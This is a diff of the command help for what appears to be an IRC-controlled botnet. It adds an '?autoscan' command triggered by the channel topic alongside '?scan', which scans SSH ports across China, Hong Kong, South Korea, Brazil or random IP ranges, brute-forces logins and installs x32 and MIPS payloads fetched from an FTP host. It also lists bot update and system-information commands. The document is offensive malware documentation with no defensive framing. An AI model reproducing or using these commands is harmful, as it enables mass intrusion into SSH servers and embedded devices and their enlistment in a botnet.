@@ -26,15 +26,19 @@ ATTACK VECTORS:
 
 SCAN FUNCTION:
 
-	?scan <network> <default> <mips>                Scan default SSH port on network, brute-force attack and exploit to the target.
+	# ?scan 	Example: ?scan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32	
+	# ?autoscan 	Example: ?autoscan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32 [myname]
+	
+	# Mark: The square brackets of IRC username is very very important for "?autoscan" command!!!
+
+	?scan <network> <default> <mips>                	Scan default SSH port on network, brute-force attack and exploit to the target.
+	?autoscan <network> <default> <mips> <username>		Auto scan command avaible for IRC channel topic only!!!
 
 		-cn		Scan on china network.
 		-hk		Scan on hong kong network.
 		-kr		Scan on south korea network.
 		-br		Scan on brazil network.
 		-r		Scan with random IPs.
-
-	# Example: ?scan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32
 		
 ?update <default> <mips>                Update bot source code or adapt it as a service.
 ?info				        Get bot system information, for bot analysis and etc.
